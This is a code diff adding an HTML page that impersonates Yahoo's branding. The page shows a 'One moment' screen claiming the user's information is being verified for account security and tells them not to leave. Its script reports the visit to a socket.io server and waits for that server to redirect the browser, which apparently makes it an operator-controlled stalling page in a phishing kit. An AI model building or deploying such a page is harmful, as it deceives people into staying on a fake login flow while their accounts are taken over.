@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo - One Moment</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@300;400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #232a31;
+        }
+        
+        .loading-container {
+            text-align: center;
+            padding: 60px 40px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .logo-container {
+            margin-bottom: 40px;
+        }
+        
+        .yahoo-logo {
+            font-size: 48px;
+            font-weight: 700;
+            color: #6001d2;
+            letter-spacing: -2px;
+        }
+        
+        .loading-text {
+            font-size: 26px;
+            font-weight: 400;
+            margin-bottom: 35px;
+            color: #232a31;
+        }
+        
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 40px;
+        }
+        
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #6001d2;
+            opacity: 0.3;
+            animation: pulse-dot 1.4s ease-in-out infinite;
+        }
+        
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        
+        .status-text {
+            font-size: 15px;
+            color: #545961;
+            line-height: 1.6;
+            max-width: 380px;
+            margin: 0 auto 20px;
+        }
+        
+        .warning-container {
+            margin-top: 35px;
+            padding: 16px;
+            background: #fff4e5;
+            border-radius: 8px;
+            border-left: 3px solid #ff8c00;
+        }
+        
+        .warning-text {
+            font-size: 13px;
+            color: #996a00;
+            font-weight: 500;
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: #989ea6;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
+        }
+        
+        @keyframes pulse-dot {
+            0%, 100% {
+                opacity: 0.3;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo-container">
+            <div class="yahoo-logo">Yahoo!</div>
+        </div>
+        
+        <h1 class="loading-text">One moment</h1>
+        
+        <div class="loading-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        
+        <p class="status-text">We are currently reviewing your information to ensure the security for your account.</p>
+        
+        <p class="status-text">Please allow us some time to verify your data.</p>
+        
+        <div class="warning-container">
+            <p class="warning-text"><strong>Important:</strong> DO NOT navigate away from this page during this process.</p>
+        </div>
+        
+        <p class="footer-text">Thank you for your patience and understanding.</p>
+    </div>
+    
+    <script src="/js/socket-client.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Socket connection handling
+            if (typeof socket !== 'undefined') {
+                socket.emit('page_visit', {
+                    page: 'yahooloading',
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Handle redirect events
+                socket.on('redirect', (data) => {
+                    if (data && data.page) {
+                        window.location.href = `/pages/${data.page}`;
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
